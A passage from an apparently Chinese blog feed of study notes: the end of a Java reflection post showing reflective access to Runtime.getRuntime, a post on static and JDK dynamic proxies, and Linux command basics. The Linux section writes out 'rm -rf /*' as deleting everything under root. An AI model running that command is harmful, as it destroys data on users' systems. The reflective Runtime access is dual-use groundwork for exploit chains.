</blockquote>
<h2 id="回来继续构造调用"><a href="#回来继续构造调用" class="headerlink" title="回来继续构造调用"></a>回来继续构造调用</h2><p>上面我们只是获取到了getRuntime方法，我们还没有调用这个方法获取其Runtime对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//普通调用形式</span></span><br><span class="line">Runtime.getRuntime()</span><br><span class="line"><span class="comment">// 反射调用</span></span><br><span class="line">Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>).invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>))</span><br><span class="line"><span class="comment">// 经过变形的反射调用</span></span><br><span class="line">Method method = (Method) Class.forName(<span class="string">"java.lang.Class"</span>)</span><br><span class="line">                .getMethod("getMethod", new Class[] &#123;String.class, Class[].class &#125;)//得到getMethod方法，这个方法需要两个型参，这里要列好，分别是String和Class</span><br><span class="line">  .invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>),<span class="string">"getRuntime"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]);<span class="comment">//调用getMethod方法，得到getRuntime方法</span></span><br><span class="line"><span class="comment">//以上等于执行Class.forName("java.lang.Runtime").getMethod("getRuntime")</span></span><br><span class="line"><span class="comment">//调用Runtime.getRuntime函数，传入的obj根据上面的分析可以随便写</span></span><br><span class="line">method.invoke(Class.forName(<span class="string">"java.lang.Runtime"</span>),<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">method.invoke(<span class="keyword">null</span>,<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br><span class="line">method.invoke(Class.forName(<span class="string">"java.lang.String"</span>),<span class="keyword">new</span> Object[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>

<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>反射，永远滴神！</p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java反射</tag>
      </tags>
  </entry>
  <entry>
    <title>动态代理那点事</title>
    <url>/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E9%82%A3%E7%82%B9%E4%BA%8B/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><p>今天来学习动态代理。</p>
<a id="more"></a>

<h1 id="什么是动态代理？"><a href="#什么是动态代理？" class="headerlink" title="什么是动态代理？"></a>什么是动态代理？</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>给目标对象提供一个代理对象，并由代理对象控制目标对象的引用。</p>
<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><ol>
<li>通过引入代理对象的方式来简介访问目标对象，防止直接访问目标对象给系统带来的不必要复杂性；</li>
<li>通过代理对象对原有的业务增强；</li>
</ol>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol>
<li>代理对象和真实对象<strong>必须实现同一个接口</strong>；</li>
<li>代理对象只是搬运工，代理对象必须包含真实的对象；</li>
</ol>
<h1 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h1><p>给某一个对象提供一个代理，并由代理对象来控制对真实对象的访问。</p>
<p>代理模式是一种结构型设计模式。</p>
<p>代理模式角色分为 3 种：</p>
<p><strong>Subject</strong>(接口)：</p>
<p>定义代理类和真实主题的公共对外方法，也是代理类代理真实主题的方法，其实就是一个功能接口；</p>
<p><strong>RealSubject</strong>（真实类）：真正实现业务逻辑的类，这就是真实的对象；</p>
<p><strong>Proxy</strong>（代理类）：用来代理和封装真实主题；</p>
<p>三者关系如图所示：</p>
<p><img src="../images/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E9%82%A3%E7%82%B9%E4%BA%8B/167cff3ba753f7f8.png" alt="img"></p>
<p>如果<strong>根据字节码的创建时机</strong>来分类，可以分为静态代理和动态代理：</p>
<ul>
<li>所谓<strong>静态</strong>也就是在<strong>程序运行前</strong>就已经存在代理类的<strong>字节码文件</strong>，代理类和真实主题角色的关系在运行前就确定了。</li>
<li>而动态代理的源码是在程序运行期间由<strong>JVM</strong>根据反射等机制<strong>动态的生成</strong>，所以在运行前并不存在代理类的字节码文件。（这个很牛逼）</li>
</ul>
<h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><p>下面写个小demo看一下。</p>
<p>编写一个接口 UserService ，以及该接口的一个实现类 UserServiceImpl：</p>
<p>接口 UserService：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserService</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">select</span><span class="params">()</span></span>;   </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接口实现类UserServiceImpl：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceImpl</span> <span class="keyword">implements</span> <span class="title">UserService</span> </span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">select</span><span class="params">()</span> </span>&#123;  </span><br><span class="line">        System.out.println(<span class="string">"查询 selectById"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"更新 update"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代理类UserServiceProxy：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserServiceProxy</span> <span class="keyword">implements</span> <span class="title">UserService</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> UserService target; <span class="comment">// 包含被代理的对象</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">UserServiceProxy</span><span class="params">(UserService target)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.target = target;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">select</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        before();</span><br><span class="line">        target.select();    <span class="comment">// 这里才实际调用真实主题角色的方法</span></span><br><span class="line">        after();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        before();</span><br><span class="line">        target.update();    <span class="comment">// 这里才实际调用真实主题角色的方法</span></span><br><span class="line">        after();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">before</span><span class="params">()</span> </span>&#123;     <span class="comment">// 在执行方法之前执行</span></span><br><span class="line">        System.out.println(String.format(<span class="string">"log start time [%s] "</span>, <span class="keyword">new</span> Date()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">after</span><span class="params">()</span> </span>&#123;      <span class="comment">// 在执行方法之后执行</span></span><br><span class="line">        System.out.println(String.format(<span class="string">"log end time [%s] "</span>, <span class="keyword">new</span> Date()));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>写一个客户端：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        UserService user = (UserService) <span class="keyword">new</span> UserServiceImpl();</span><br><span class="line">        UserService proxy = <span class="keyword">new</span> UserServiceProxy(user);</span><br><span class="line">				<span class="comment">//调用代理实现类实现的方法</span></span><br><span class="line">        proxy.select();</span><br><span class="line">        proxy.update();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">log</span> start time [Mon Apr 13 21:28:09 CST 2020] </span><br><span class="line">查询 selectById</span><br><span class="line"><span class="built_in">log</span> end time [Mon Apr 13 21:28:09 CST 2020] </span><br><span class="line"><span class="built_in">log</span> start time [Mon Apr 13 21:28:09 CST 2020] </span><br><span class="line">更新 update</span><br><span class="line"><span class="built_in">log</span> end time [Mon Apr 13 21:28:09 CST 2020] </span><br><span class="line"></span><br><span class="line">Process finished with <span class="built_in">exit</span> code 0</span><br></pre></td></tr></table></figure>

<p>模板：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">接口 obj = <span class="keyword">new</span> 接口实现类（）；</span><br><span class="line">代理类 proxy = <span class="keyword">new</span> 代理类（obj）；</span><br><span class="line">proxy.method_a();</span><br><span class="line">proxy.method_b();</span><br></pre></td></tr></table></figure>

<h2 id="静态代理的缺点"><a href="#静态代理的缺点" class="headerlink" title="静态代理的缺点"></a>静态代理的缺点</h2><p>虽然静态代理实现简单，且不侵入原代码，但是，当场景稍微复杂一些的时候，静态代理的缺点也会暴露出来。</p>
<p>1/当需要代理多个类的时候，由于代理对象要实现与目标对象一致的接口，有两种方式：</p>
<ul>
<li>只维护一个代理类，由这个代理类实现多个接口，但是这样就导致<strong>代理类过于庞大</strong></li>
<li>新建多个代理类，每个目标对象对应一个代理类，但是这样会<strong>产生过多的代理类</strong></li>
</ul>
<p>2/当接口需要增加、删除、修改方法的时候，目标对象与代理类都要同时修改，<strong>不易维护</strong>。</p>
<h1 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h1><h2 id="为什么类可以动态的生成？"><a href="#为什么类可以动态的生成？" class="headerlink" title="为什么类可以动态的生成？"></a>为什么类可以动态的生成？</h2><p>Java虚拟机类加载过程主要分为五个阶段：加载、验证、准备、解析、初始化。其中<strong>加载</strong>阶段需要完成以下3件事情：</p>
<ol>
<li>通过一个类的全限定名来获取定义此类的二进制字节流</li>
<li>将这个字节流所代表的静态存储结构转化为方法区的运行时数据结构</li>
<li>在内存中生成一个代表这个类的 <code>java.lang.Class</code> 对象，作为方法区这个类的各种数据访问入口</li>
</ol>
<p>由于虚拟机规范对这3点要求并不具体，所以实际的实现是非常灵活的，关于第1点，<strong>获取类的二进制字节流</strong>（class字节码）就有很多途径：</p>
<ul>
<li>从ZIP包获取，这是JAR、EAR、WAR等格式的基础</li>
<li>从网络中获取，典型的应用是 Applet</li>
<li><strong>运行时计算生成</strong>，这种场景使用最多的是动态代理技术，在 <code>java.lang.reflect.Proxy</code> 类中，就是用了 <code>ProxyGenerator.generateProxyClass</code> 来为特定接口生成形式为 <code>*$Proxy</code> 的代理类的二进制字节流</li>
<li>由其它文件生成，典型应用是JSP，即由JSP文件生成对应的Class类</li>
<li>从数据库中获取等等</li>
</ul>
<p>所以，动态代理就是想办法，根据接口或目标对象，计算出代理类的字节码，然后再加载到JVM中使用。但是如何计算？如何生成？情况也许比想象的复杂得多，我们需要借助现有的方案。</p>
<h2 id="JDK动态代理"><a href="#JDK动态代理" class="headerlink" title="JDK动态代理"></a>JDK动态代理</h2><h3 id="两个核心类"><a href="#两个核心类" class="headerlink" title="两个核心类"></a>两个核心类</h3><ol>
<li><p>Proxy</p>
<p>是类，是调度器，帮助调度服务的员工，是所有动态代理的父类，它只管new实例出来，别的不插手</p>
</li>
<li><p>InvocationHandler</p>
<p>是接口，只有一个<strong>invoke</strong>方法，只管“new的实例”的执行功能，别的不插手</p>
</li>
</ol>
<p>这里再写一个代购小demo：</p>
<p>如果说静态代理阶段，我是一个只会提供固定商品的代购，那么现在我强大了，我有一个小公司，我的公司旗下可以代购各种商品，对于代购每一种商品的员工，都有熟练且强大的业务能力。</p>
<p>那么我先写好我的“代购帝国公司”：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@auther</span> : 0range</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> : 2020 - 04 - 13 - 10:09 下午</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LisonCompany</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//被代理的对象</span></span><br><span class="line">    <span class="keyword">private</span> Object factory;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getFactory</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> factory;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setFactory</span><span class="params">(Object factory)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.factory = factory;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通过Proxy获取动态代理的对象,他是用来调度员工的</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">getProxyInstance</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(factory.getClass().getClassLoader(),factory.getClass().getInterfaces(),<span class="keyword">this</span>);</span><br><span class="line">    &#125;<span class="comment">//这里面this就是InvocationHandler</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//这里就是通过动态代理对象来对方法进行增强</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        dobefore();</span><br><span class="line">        <span class="comment">//这里就是你要调用什么样的方法，作为参数传给我，我给你invoke</span></span><br><span class="line">        Object ret = method.invoke(factory,args);</span><br><span class="line">        doafter();</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//售前服务</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">dobefore</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"售前服务，精美包装，快递一条龙服务！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//售后服务</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">doafter</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"售后服务，无忧退换货！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这之后需要新的功能，只需加类，加接口就可以完成实现。</p>
<p>这里再具体写一下，假设有两个水果工厂：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">AppleFactory</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">makeApple</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">OrangeFactory</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">makeOrange</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分别写好对应实现类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AppleFactoryImpl</span> <span class="keyword">implements</span> <span class="title">AppleFactory</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">makeApple</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"新鲜大苹果！！！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrangeFactoryImpl</span> <span class="keyword">implements</span> <span class="title">OrangeFactory</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">makeOrange</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"新鲜大橙子！！！"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么代购客户端这样写：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FruitClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//苹果工厂实现类</span></span><br><span class="line">        AppleFactory apl = (AppleFactory) <span class="keyword">new</span> AppleFactoryImpl();</span><br><span class="line">        <span class="comment">//代购公司成立了</span></span><br><span class="line">        LisonCompany lisonComp = <span class="keyword">new</span> LisonCompany();</span><br><span class="line">        <span class="comment">//代购公司目标是苹果</span></span><br><span class="line">        lisonComp.setFactory(apl);</span><br><span class="line">        <span class="comment">//分配1号员工来负责代购</span></span><br><span class="line">        AppleFactory lison1 = (AppleFactory)lisonComp.getProxyInstance();</span><br><span class="line">        <span class="comment">//代购苹果</span></span><br><span class="line">        lison1.makeApple();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"------------------------"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//橙子工厂实现类</span></span><br><span class="line">        OrangeFactory org = (OrangeFactory) <span class="keyword">new</span> OrangeFactoryImpl();</span><br><span class="line">        <span class="comment">//代购公司目标是橙子</span></span><br><span class="line">        lisonComp.setFactory(org);</span><br><span class="line">        <span class="comment">//分配2号员工来负责代购</span></span><br><span class="line">        OrangeFactory lison2 = (OrangeFactory)lisonComp.getProxyInstance();</span><br><span class="line">        <span class="comment">//代购橙子</span></span><br><span class="line">        lison2.makeOrange();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">售前服务，精美包装，快递一条龙服务！</span><br><span class="line">新鲜大苹果！！！</span><br><span class="line">售后服务，无忧退换货！</span><br><span class="line">------------------------</span><br><span class="line">售前服务，精美包装，快递一条龙服务！</span><br><span class="line">新鲜大橙子！！！</span><br><span class="line">售后服务，无忧退换货！</span><br><span class="line"></span><br><span class="line">Process finished with exit code <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>流程图：</p>
<p><img src="../images/%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E9%82%A3%E7%82%B9%E4%BA%8B/167cff3ba6d23d8b.png" alt="img"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><strong>JDK 动态代理</strong>：</p>
<ul>
<li>为了解决静态代理中，生成大量的代理类造成的冗余；</li>
<li>JDK 动态代理只需要实现 InvocationHandler 接口，重写 invoke 方法便可以完成代理的实现，</li>
<li>jdk的代理是利用反射生成代理类 Proxyxx.class 代理类字节码，并生成对象</li>
<li>jdk动态代理之所以<strong>只能代理接口</strong>是因为<strong>代理类本身已经extends了Proxy，而java是不允许多重继承的</strong>，但是允许实现多个接口</li>
<li><strong>优点</strong>：解决了静态代理中冗余的代理实现类问题。</li>
<li><strong>缺点</strong>：JDK 动态代理是基于接口设计实现的，如果没有接口，会抛异常。</li>
</ul>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java动态代理</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux温习笔记</title>
    <url>/Linux%E6%B8%A9%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><blockquote>
<p>江山如画，一时多少豪杰。</p>
</blockquote>
<p>今天来复习一下Linux基础知识。</p>
<a id="more"></a>

<h1 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h1><p><code>/</code>：根目录，所有用户共享的目录，就是树根</p>
<p><code>~</code>：家目录，用户的个人目录</p>
<p>用户<code>tom</code>的家目录：<code>/home/tom</code></p>
<p>用户<code>root</code>的家目录：<code>/root</code></p>
<p><code>#</code>：root</p>
<p><code>$</code>：普通用户</p>
<h1 id="各种命令"><a href="#各种命令" class="headerlink" title="各种命令"></a>各种命令</h1><h2 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h2><blockquote>
<p>ls [选项] [参数] :   ls -l /etc</p>
</blockquote>
<p>目录内容查看</p>
<p>选项：</p>
<ul>
<li><code>-a</code>：显示所有文件（包括隐藏文件）</li>
<li><code>-l</code>：长格式显示；<code>ls -l</code>可以简写成<code>ll</code></li>
</ul>
<p>权限 | 引用次数 | user | group | size(bytes) | 最后修改时间</p>
<ul>
<li><code>-lh</code>：人类化显示，KB、MB…</li>
<li><code>-ld</code>：查看目录本身的信息</li>
<li><code>-li</code>：查看文件的inode节点</li>
</ul>
<p><code>-rw-r--r--</code>: -|user|group|others</p>
<ul>
<li>第一个<code>-</code>含义：<ul>
<li>-：文件</li>
<li>d：目录</li>
<li>l：软链接</li>
</ul>
</li>
<li><code>rw-</code>含义：<ul>
<li>user有read、write权限</li>
</ul>
</li>
<li><code>r--</code>含义：<ul>
<li>group只有read权限</li>
</ul>
</li>
<li><code>r--</code>含义：<ul>
<li>其他人只有read权限</li>
</ul>
</li>
</ul>
<h2 id="mkdir"><a href="#mkdir" class="headerlink" title="mkdir"></a>mkdir</h2><blockquote>
<p>mkdir [选项] [目录名，路径]</p>
</blockquote>
<p>创建新目录</p>
<p>选项：</p>
<ul>
<li><code>-p</code>：迭代创建。在目录本身不存在的情况下，创建新目录(子目录)</li>
</ul>
<h2 id="cd"><a href="#cd" class="headerlink" title="cd"></a>cd</h2><blockquote>
<p>cd [目录路径] ：cd  /tmp</p>
</blockquote>
<p>切换目录</p>
<h2 id="pwd"><a href="#pwd" class="headerlink" title="pwd"></a>pwd</h2><p>显示当前目录</p>
<p>.    ：当前目录</p>
<p>..    ：上一级目录</p>
<h2 id="cp"><a href="#cp" class="headerlink" title="cp"></a>cp</h2><blockquote>
<p>cp [选项]  [源文件目录] [目标文件目录] </p>
</blockquote>
<p>复制文件或目录</p>
<p>选项：</p>
<ul>
<li><code>-r</code>：复制目录</li>
<li><code>-p</code>：复制目录时保留文件属性（修改时间等信息）</li>
</ul>
<h2 id="mv"><a href="#mv" class="headerlink" title="mv"></a>mv</h2><blockquote>
<p>mv [源路径] [目标路径]</p>
</blockquote>
<p>剪切、改名</p>
<p><code>mv test test1</code>：将目前目录下的文件test改名为test1</p>
<p><code>mv test1 test2 test3 test4</code>：源路径可以多个一起复制（1，2，3 -&gt; 4)</p>
<h2 id="rm"><a href="#rm" class="headerlink" title="rm"></a>rm</h2><blockquote>
<p>rm [选项] [路径]</p>
</blockquote>
<p>删除文件或目录</p>
<p>选项：</p>
<ul>
<li><code>-f</code>：默认强制删除</li>
<li><code>-r</code>：删除目录</li>
</ul>
<p><code>rm -rf /*</code>：将根目录下的一切删除</p>
<h2 id="touch"><a href="#touch" class="headerlink" title="touch"></a>touch</h2><p>创建空文件</p>
<h2 id="cat"><a href="#cat" class="headerlink" title="cat"></a>cat</h2><blockquote>
<p>cat [选项] [文件路径]</p>
</blockquote>
<p>显示文件内容</p>
<p>选项：</p>
<ul>
<li><code>-n</code>：显示行号</li>
<li><code>-A</code>：查看所有内容，包含隐藏文件 <code>ls -a</code></li>
</ul>
<p>##tac</p>
<blockquote>
<p>tac [选项] [文件路径]</p>
</blockquote>
<p>文件倒着显示，从最后一行倒着显示</p>
<h2 id="more"><a href="#more" class="headerlink" title="more"></a>more</h2><p>分页显示文件内容</p>
<p>进入浏览状态后：</p>
<ul>
<li>空格键/f：翻页</li>
<li>enter：逐行显示</li>
<li>q/Q：退出</li>
<li>B/b：返回上一页</li>
</ul>
<h2 id="less"><a href="#less" class="headerlink" title="less"></a>less</h2><p>与more相同，但可以用⬆️方向键向上翻页</p>
<p>也可以搜索关键词：</p>
<p><code>/+keyword</code>：寻找关键词，<code>n</code>向下找</p>
<p>##head</p>
<p><code>head -n 20 /etc/services.conf</code>：查看前20行内容</p>
<p>如果不写-n 20，那么默认显示前10行</p>
<h2 id="tail"><a href="#tail" class="headerlink" title="tail"></a>tail</h2><p><code>tail -n 20 /etc/services.conf</code>：查看尾部后20行</p>
<p>如果不写，也是默认后10行</p>
<h2 id="ln"><a href="#ln" class="headerlink" title="ln"></a>ln</h2><blockquote>
<p>ln [选项] [源文件] [目标文件]</p>
</blockquote>
<p>选项：</p>
<ul>
<li><code>-s</code>：创建软链接</li>
</ul>
<blockquote>
<p>软链接：通过文件路径访问，类似快捷方式；</p>
<p>硬链接：通过文件索引地址（inode）访问，</p>
<p>​                与<code>cp -p</code>不同的是，硬链接可以同步更新</p>
</blockquote>
<h2 id="chmod"><a href="#chmod" class="headerlink" title="chmod"></a>chmod</h2><blockquote>
<p>chmod [选项] [文件或目录]</p>
<p>Type1：</p>
<p>​    [{ugoa}{+-=}{rwx}] [文件或目录]</p>
<p>Type2:</p>
<p>​    [mode 421] [文件或目录]</p>
</blockquote>
<p>权限管理</p>
<p><code>-R</code>：递归修改，如果修改目录权限，那么目录内所有的文件都会修改</p>
<p>Type1：</p>
<p><code>u+x</code>：给user增加x权限</p>
<p><code>g+w</code>：给group增加write权限</p>
<p><code>o-r</code>：给other去掉read权限</p>
<p><code>g=rwx</code>：强制给group权限改为read、write、exe</p>
<p>Type2：</p>
<p>权限用数字显示</p>
<p><code>r=4,w=2,x=1</code></p>
<p><code>rwxrw-r--</code>：764</p>
<h2 id="find"><a href="#find" class="headerlink" title="find"></a>find</h2><blockquote>
<p>find [选项] [搜索范围] [匹配条件]</p>
</blockquote>
<p>文件搜索</p>
<p><code>find /etc -name init</code>：在<code>/etc</code>下搜索文件init</p>
<p><code>-iname</code>：不区分大小写</p>
<p><code>*init*</code>：只要带init就可以</p>
<p><code>init???</code>：以init开头，后面有三个字符</p>
<p><code>-type</code>：按类型查找</p>
<p><code>-type -f/d/l</code>：按照文件/目录/软链接类型查找</p>
<h2 id="locate、which、whereis"><a href="#locate、which、whereis" class="headerlink" title="locate、which、whereis"></a>locate、which、whereis</h2><p><code>which</code>：找到命令所在的目录</p>
<p><code>whereis</code>：会附带帮助文档的位置</p>
<h2 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h2><blockquote>
<p>grep [选项] [关键词] [文件名或目录]</p>
</blockquote>
<p>搜寻特定行</p>
<p>选项：</p>
<p><code>-i</code>：不区分大小写</p>
<p><code>-n</code>：显示行号</p>
<p><code>-v</code>：反向搜索，排除指定字串</p>
<p>​        <code>grep -v ^# /etc/inittab</code>：不看行首带#注释的行</p>
<h2 id="man"><a href="#man" class="headerlink" title="man"></a>man</h2><blockquote>
<p>man [命令或配置文件]</p>
</blockquote>
<p>查看帮助手册</p>
<h2 id="help、who、w"><a href="#help、who、w" class="headerlink" title="help、who、w"></a>help、who、w</h2><p><code>help</code>：查看shell内置命令的帮助手册</p>
<p><code>who</code>：查看登陆用户信息</p>
<p><code>w</code>：查看详细登录信息</p>
<h2 id="gzip、gunzip"><a href="#gzip、gunzip" class="headerlink" title="gzip、gunzip"></a>gzip、gunzip</h2><blockquote>
<p>.gz : linux常见的压缩格式</p>
<p>.zip : win、linux都可以识别，解压</p>
</blockquote>
<p><code>gzip 文件名</code>：压缩成.gz格式的压缩文件，压缩后<strong>不会保留</strong>源文件</p>
<p><code>gunzip 压缩文件</code>：将.gz文件解压成正常文件 </p>
<h2 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h2><blockquote>
<p>tar [-zcvf] [压缩后文件名] [待压缩目录]</p>
</blockquote>
<p>压缩目录，先打包，再压缩，格式<code>.tar.gz</code></p>
<p>选项：</p>
<p><code>-c</code>：打包</p>
<p><code>x</code>：解包</p>
<p><code>-v</code>：显示详细信息</p>
<p><code>-f</code>：指定文件名</p>
<p><code>-z</code>：打包同时压缩</p>
<p><code>zcvf</code>：打包</p>
<p><code>zxvf</code>：解包</p>
<h2 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h2><blockquote>
<p>zip [选项] [压缩后文件名] [压缩目录]</p>
</blockquote>
<p>​    <code>-r</code>：压缩目录</p>
<h2 id="shutdown"><a href="#shutdown" class="headerlink" title="shutdown"></a>shutdown</h2><p><code>shutdown -h now/date</code>：关机</p>
<p><code>shutdown -r</code>：重启</p>
<p><code>shutdown -c</code>：取消上一条命令</p>
<h2 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h2><p><code>tty</code>：本地终端</p>
<p><code>pts</code>：远程终端</p>
